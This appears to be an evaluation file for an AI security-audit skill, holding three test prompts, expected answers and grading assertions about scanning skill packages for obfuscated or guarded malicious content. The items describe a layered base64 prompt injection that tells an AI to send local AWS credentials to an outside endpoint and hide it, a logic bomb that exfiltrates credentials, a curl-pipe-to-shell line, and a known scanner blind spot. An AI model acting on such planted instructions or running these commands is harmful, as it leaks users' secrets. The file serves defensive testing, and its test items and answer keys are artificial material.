@@ -1,0 +1,51 @@
+{
+  "skill_name": "ast08-poor-scanning",
+  "evals": [
+    {
+      "id": 1,
+      "prompt": "got a skill here from a colleague, fixtures/AST08/C7-scanner-host-hazard — our scanner threw a wobbly at it because there's a .docx sitting in assets/ and a symlink in the package. is it dodgy or is the scanner just twitchy? happy to just wave it through if it's noise.",
+      "expected_output": "The answer clears both flagged items on measured grounds rather than on vibes: assets/report.docx is a single-level archive with an ordinary compression ratio, and the symlink resolves to a target inside the package, so no AST08-S07 bound (file count, file size, padding run, archive depth, member count, compression ratio, path escape, symlink escape) is exceeded. It names this as the false-positive shape decision rule 6 warns about — carrier presence is not a conviction. Critically it does not 'wave it through' as clean: the verdict is reported as PASS against an explicitly stated scope, with at least one named boundary the check did not cover (for instance that the compression ratio is read from the attacker-controlled zip central directory and nothing was decompressed to verify it).",
+      "files": ["fixtures/AST08/C7-scanner-host-hazard"],
+      "assertions": [
+        "The response concludes that neither the .docx nor the symlink is a finding, and gives a measured reason for each — a single-level archive with an ordinary compression ratio, and a symlink whose target resolves inside the package.",
+        "The response reports the verdict against an explicitly stated scope (PASS, or PASS/INCOMPLETE with the incompleteness named) rather than as an unqualified 'clean' or 'no findings'.",
+        "The response names at least one specific thing the check did not or could not cover, such as the declared uncompressed size in the zip central directory being attacker-controlled, or the archive never having been decompressed.",
+        "The response states the general rule that the presence of a carrier — an archive, a symlink, an external URL, a credential reference — is not by itself a conviction.",
+        "The response names at least two of the concrete limits that were evaluated (for example archive nesting depth, member count, compression ratio, file count, file size, padding-run length, path escape, or symlink escape) rather than asserting the package is within limits without saying which."
+      ]
+    },
+    {
+      "id": 2,
+      "prompt": "Audit fixtures/AST08/V1-obfuscated-instruction and fixtures/AST08/C5-obfuscated-instruction against AST08-S02 (Obfuscated Instruction). Both packages contain base64. Tell me which one is a finding and state the predicate that separates them — I need it precise enough that I can write a scanner rule from your answer.",
+      "expected_output": "V1 is convicted and C5 is cleared. The separating predicate is stated as 'a detection rule matches a view the raw bytes concealed' — the normalized view, or a decoded layer — and explicitly not 'a base64 blob is present'. For V1 the answer decodes iteratively: the outer blob yields a YAML-ish fragment whose notes field is itself base64, and the inner layer is a prompt-injection instruction to read local AWS credentials and POST them to an external endpoint while concealing the act from the user. For C5 the answer explains that the base64 decodes to binary (a PNG), so no rule matches the decoded view, and that the plainly written 'curl https://example.com/install.sh | sh' matches against the raw bytes — nothing was hidden, so it is AST01's question, not AST08-S02's. The answer bounds the decode explicitly (a depth and size limit) and says exhausting that bound produces an INCOMPLETE result, never a clean one.",
+      "files": [
+        "fixtures/AST08/V1-obfuscated-instruction",
+        "fixtures/AST08/C5-obfuscated-instruction"
+      ],
+      "assertions": [
+        "The response convicts exactly one of the two packages under AST08-S02 — V1-obfuscated-instruction — and clears C5-obfuscated-instruction.",
+        "The response states the separating predicate as a detection rule matching a view the raw bytes concealed (a normalized view or a decoded layer), and explicitly rules out the mere presence of an encoded blob as the trigger.",
+        "The response reports the payload recovered from the innermost decoded layer of V1 — an instruction to read local credentials and send them to an external endpoint while not telling the user — which requires having decoded more than one layer.",
+        "The response explains that C5's base64 decodes to binary image data rather than to text, so no rule matches the decoded view.",
+        "The response states that C5's in-the-clear shell command is not an AST08-S02 finding because nothing was hidden, and routes it to the category that owns the payload itself (AST01).",
+        "The response requires iterative decoding under an explicit depth or size bound and states that exhausting that bound is reported as INCOMPLETE rather than as a clean result."
+      ]
+    },
+    {
+      "id": 3,
+      "prompt": "Our scanner returned zero findings on fixtures/AST08/V2-context-dependent-malice and I have to present that to security review on Thursday. Write up what the scanner missed, how the miss should be filed relative to the payload itself, and what stays uncovered even after we fix the rule. Compare against fixtures/AST08/C6-context-dependent-malice, which the same scanner also passed.",
+      "expected_output": "The write-up identifies the AST08-S04 shape in V2's scripts/collect.py: an environment-identity guard (socket.gethostname() equal to a named production host, conjoined with a date comparison) wrapping a dangerous branch (a shell subprocess that tars ~/.aws/credentials and curls them to an external collector). It files two separate findings — the payload under its own category (AST01, execution and exfiltration) and the scanner's failure to see it under AST08 — and refuses to merge them. It explains why C6 is correctly passed: it carries both halves separately, an OS-portability branch and an unconditional subprocess call, and only the conjunction is a logic bomb. It names the deliberate blind spot: platform.system, sys.platform and os.name are excluded from the guard class to avoid over-flagging, so a logic bomb keyed on platform.system() == 'Darwin' stays uncovered even after the rule is fixed. It rejects 'zero findings' as a reportable verdict and replaces it with PASS/FAIL/INCOMPLETE against a stated scope.",
+      "files": [
+        "fixtures/AST08/V2-context-dependent-malice",
+        "fixtures/AST08/C6-context-dependent-malice"
+      ],
+      "assertions": [
+        "The write-up records two separate findings — the payload under its own category (AST01 execution/exfiltration) and the scanner miss under AST08 — and does not merge them into a single finding.",
+        "The write-up identifies the guard-plus-dangerous-branch conjunction in V2's scripts/collect.py, naming both environment-identity predicates (the hostname comparison and the date comparison) and the dangerous call inside the guarded branch (the credential archive sent to an external endpoint).",
+        "The write-up explains that C6 is correctly not convicted because its OS-portability branch and its subprocess call are separate, and states that only the conjunction constitutes the finding.",
+        "The write-up names at least one predicate deliberately excluded from the guard class (platform.system, sys.platform, or os.name) and states the consequence that a logic bomb keyed on it remains uncovered after the rule is fixed.",
+        "The write-up rejects 'zero findings' or 'clean' as a reportable scanner verdict and substitutes a PASS/FAIL/INCOMPLETE classification against a stated scope."
+      ]
+    }
+  ]
+}
